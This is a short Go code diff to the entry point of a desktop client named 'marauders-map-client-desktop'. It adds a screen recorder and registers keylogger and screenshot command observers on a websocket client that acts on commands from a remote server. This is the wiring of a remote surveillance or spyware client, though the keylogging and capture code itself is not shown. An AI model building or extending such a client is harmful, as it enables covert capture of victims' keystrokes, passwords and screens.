@@ -2,6 +2,7 @@ package main
 
 import (
 	"marauders-map-client-desktop/internal/deploy"
+	"marauders-map-client-desktop/internal/screen"
 	"marauders-map-client-desktop/internal/wsclient"
 	"marauders-map-client-desktop/internal/wsclient/observer"
 )
@@ -27,9 +28,10 @@ func main() {
 
 	// Observer for processing incoming
 	// commands from server
+	screenrecorder := screen.NewScreenRecorder(5)
 	subject := &observer.Subject{}
-	subject.AddListener(&observer.KeyloggerCmdObserver{})
-	subject.AddListener(&observer.ScreenshotCmdObserver{})
+	subject.AddListener(observer.NewKeyloggerCmdObserver())
+	subject.AddListener(observer.NewScreenshotCmdObserver(screenrecorder))
 
 	// Start connection and communication with server
 	// Subject with Observers is passed as parameter
